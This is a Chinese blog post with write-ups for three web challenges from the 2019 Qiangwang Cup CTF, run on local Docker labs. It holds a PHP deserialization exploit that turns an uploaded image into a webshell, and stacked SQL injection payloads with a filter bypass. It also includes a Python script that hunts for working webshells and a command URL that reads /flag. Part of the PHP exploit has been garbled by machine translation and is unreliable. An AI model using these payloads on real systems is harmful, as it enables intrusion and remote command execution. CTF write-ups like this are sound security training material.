

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="osword">
  <meta name="keywords" content="">
  <title>2019强网杯web部分题解 - osword&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
    
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 4.2.1"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2019-05-28 21:27" pubdate>
        2019年5月28日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      771 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      10
       分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">2019强网杯web部分题解</h1>
            
            <div class="markdown-body" id="post-body">
              <h1 id="0x01上传"><a href="#0x01上传" class="headerlink" title="0x01上传"></a>0x01上传</h1><p>Docker环境：https：//github.com/CTFTraining/qwb_2019_upload<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br>刚开始正常上传图片，可以得到图片马路径，但是文件后缀被修改且没有文件包含点。<br>通过dirsearch扫到网站源码。<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p>
<p>拿到源码首先需要查看配置文件和路由<br>，看了一眼配置文件，cache.php无缓存文件功能，不能写入一句话木马读取。</p>
<p><img src="./3.png" srcset="/img/loading.gif" alt=""></p>
<p>查看TP5 /路由/ route.php路由功能文件，分析URL访问时控制类调用情况。<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p>
<p>Thinkphp5框架是最新版，没有找到漏洞。遂跟进网站应用控制类下。</p>
<p>TP5 /应用/网页/控制器/ index.php的第37行<br>$profile通过cookie传入，存在任意类反序列化操作<br><img src="./5.png" srcset="/img/loading.gif" alt=""></p>
<p>搜索有可以利用的函数，发现TP5 /应用/网页/控制器/ Profile.php第43行<br>存在文件重名操作copy</p>
<p><img src="./6.png" srcset="/img/loading.gif" alt=""><br>在profile.php下文件存在<strong>get()、</strong>call()魔术方法可以利用。<br><strong>call()通过类调用不存在方法而触发。通过可以</strong>get()向$this-&gt;{$name}传入upload_img方法，进行upload_img()方法二次调用，执行文件名重写。</p>
<p><img src="./7.png" srcset="/img/loading.gif" alt=""></p>
<p>在TP5 /应用/网页/控制器/ Register.php第58行，发现析构函数，检查为类变量可控。通过类轮廓调用不存在的索引（）方法即可触发轮廓类下的__call魔术方法。</p>
<p><img src="./8.png" srcset="/img/loading.gif" alt=""><br>编写EXP</p>
<pre><code class="hljs ruby">&lt;？php 
namespace app \ web \ controller; 
使用think \ Controller; 
/<span class="hljs-regexp">/先传入带有shell的图片马，然后将生成的cookie替换当前用户字段，重新加载界面，就可以执行木马。路径可以在传入图片之后网页源码找到</span>
<span class="hljs-regexp">.class Register &#123; </span>
<span class="hljs-regexp">    public $ checker; </span>
<span class="hljs-regexp">    public $ registed = false; </span>
<span class="hljs-regexp">    public function __construct（$ checker）</span>
<span class="hljs-regexp">    &#123; </span>
<span class="hljs-regexp">        $ this-&gt; checker = $ checker; </span>
<span class="hljs-regexp">    &#125; </span>
<span class="hljs-regexp">&#125; </span>
<span class="hljs-regexp">类档案&#123; </span>
<span class="hljs-regexp">    公共$ filename_tmp = “./</span>上传/ <span class="hljs-number">122</span>c4a55d1a70cef972cac3982dd49a6 / f3ccdd27d2000e3f9255a7e3e2c4880<span class="hljs-number">0</span>.png”; 
    public $ filename =“./ upload / <span class="hljs-number">122</span>c4a55d1a70cef972cac3982dd49a6 / shell.php”; 
    public $ ext = <span class="hljs-literal">true</span>; 
    public $ except = array（<span class="hljs-string">'index'</span>=&gt;<span class="hljs-string">'upload_img'</span>）; 
&#125; 
$ a = new Register（new Profile（））;
印刷（用urlencode（BASE64_ENCODE（连载（$ A））））;</code></pre>

<p><img src="./9.png" srcset="/img/loading.gif" alt=""></p>
<h2 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h2><p><img src="./10.png" srcset="/img/loading.gif" alt=""></p>
<h1 id="0x02随便注"><a href="#0x02随便注" class="headerlink" title="0x02随便注"></a>0x02随便注</h1><p>Docker：https：//github.com/CTFTraining/qwb_2019_supersqli<br>尝试Sql注入弹出如下过滤情况<br><img src="./11.png" srcset="/img/loading.gif" alt=""><br>发现存在堆叠注入<br><code>1’;show tables;#</code><br><img src="./12.png" srcset="/img/loading.gif" alt=""></p>
<p>使用预编译语句插入查询语句<br>参考官方链接:(编写的SQL语句语法）[ <a href="https://dev.mysql.com/doc/refman/8.0/en/sql-syntax-prepared-statements.html]" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/sql-syntax-prepared-statements.html]</a></p>
<pre><code class="hljs less">设置<span class="hljs-variable">@sql</span> = concat（<span class="hljs-string">'sel'</span>，<span class="hljs-string">'ect * from'</span><span class="hljs-number">1919810931114514</span>`'）; 
从<span class="hljs-variable">@sql</span>准备presql; 
执行<span class="hljs-selector-tag">presql</span>; 
<span class="hljs-selector-tag">deallocate</span>准备<span class="hljs-selector-tag">presql</span>;</code></pre>
<p><img src="./13.png" srcset="/img/loading.gif" alt=""></p>
<p>使用strstr过滤set、prepare。大小写绕过即可<br><img src="./14.png" srcset="/img/loading.gif" alt=""></p>
<h1 id="高明的黑客"><a href="#高明的黑客" class="headerlink" title="高明的黑客"></a>高明的黑客</h1><p>Docker：https：//github.com/CTFTraining/qwb_2019_smarthacker</p>
<p><img src="./15.png" srcset="/img/loading.gif" alt=""><br>拉下网页源码，发现存在shell语句但无法判断哪个是真正的Shell<br><img src="./16.png" srcset="/img/loading.gif" alt=""><br>类似有assert、eval、system相关函数<br>编写脚本批量查shell<br><img src="./17.png" srcset="/img/loading.gif" alt=""><br><a href="http://127.0.0.1:8304/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag" target="_blank" rel="noopener">http://127.0.0.1:8304/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</a><br><img src="./18.png" srcset="/img/loading.gif" alt=""></p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> os,re,requests

filename=os.listdir(<span class="hljs-string">'/var/www/html/src'</span>)
pattern=re.compile(<span class="hljs-string">r"\$_[GETPOS]&#123;3,4&#125;\[.*\]"</span>)
j=<span class="hljs-number">1</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> filename:
    q=j+<span class="hljs-number">1</span>
    print(i)
    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'/var/www/html/src/'</span>+i,<span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
        data=f.read()
    reqname=list(set(pattern.findall(data)))
    <span class="hljs-keyword">for</span> ret <span class="hljs-keyword">in</span> reqname:
        <span class="hljs-keyword">try</span>:
            command=<span class="hljs-string">'uname'</span>
            flag=<span class="hljs-string">'Linux'</span>
            <span class="hljs-keyword">if</span> <span class="hljs-string">'GET'</span> <span class="hljs-keyword">in</span> ret:
                parm=re.findall(<span class="hljs-string">r"'(.*)'"</span>,ret)[<span class="hljs-number">0</span>]
                url=<span class="hljs-string">"http://127.0.0.1:8304/"</span>+i
                params=&#123;parm:command&#125;
                r=requests.get(url=url,params=params)
                <span class="hljs-keyword">if</span> flag <span class="hljs-keyword">in</span> r.text:
                    print(<span class="hljs-string">'webshell filename is: '</span>+i)
                    print(<span class="hljs-string">'GET_name: '</span>+parm)
            <span class="hljs-keyword">if</span> <span class="hljs-string">'POST'</span> <span class="hljs-keyword">in</span> ret:
                parm=re.findall(<span class="hljs-string">r"'(.*)'"</span>,ret)[<span class="hljs-number">0</span>]
                url=<span class="hljs-string">"http://127.0.0.1:8304/"</span>+i
                data=&#123;parm:command&#125;
                r=requests.post(url=url,data=data)
                <span class="hljs-keyword">if</span> flag <span class="hljs-keyword">in</span> r.text:
                    print(<span class="hljs-string">'webshell filename is: '</span>+i)
                    print(<span class="hljs-string">'POST_name: '</span>+parm)
        <span class="hljs-keyword">except</span>: <span class="hljs-keyword">pass</span></code></pre>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2019/06/02/RIPS-2-filter-var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">RIPS[2] | filter_var函数缺陷</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2019/05/28/2019ISCC-web%E9%A2%98%E8%A7%A3/">
                        <span class="hidden-mobile">2019ISCC_web题解</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "2019强网杯web部分题解&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>




















</body>
</html>
